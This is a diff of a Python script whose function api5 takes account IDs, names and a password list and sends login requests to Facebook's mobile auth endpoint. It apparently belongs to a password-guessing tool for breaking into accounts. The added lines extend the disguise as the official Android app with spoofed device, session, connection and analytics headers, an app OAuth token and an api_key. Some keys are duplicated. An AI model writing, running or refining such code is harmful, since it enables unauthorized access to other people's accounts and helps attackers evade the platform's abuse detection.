@@ -491,26 +491,36 @@ def api5(ids,names,passlist):
                                         "meta_inf_fbmeta": "",
                                         'generate_analytics_claim':'1',
                                         "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
+                                        "currently_logged_in_userid": "0",
+                                        "locale": "en_US",
+                                        "client_country_code": "US",
                                         "locale":"en_US","client_country_code":"US",
                                         'device':gtt,
                                         'device_id':str(uuid.uuid4()),
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
+                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                         
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':'45201',
                                         'x-fb-connection-type':'MOBILE.LTE',
+                                        'X-Tigon-Is-Retry': 'False',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,                                      
                                         'x-fb-net-hni':'45204',
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                         'x-fb-device-group': '5120',
+                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                         'x-fb-connection-quality':'EXCELLENT',
+                                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
+                                        'X-FB-Client-IP': 'True',
+                                        'X-FB-Server-Cluster': 'True',
                                         'x-fb-http-engine':     'Liger'}
                                 url =   'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
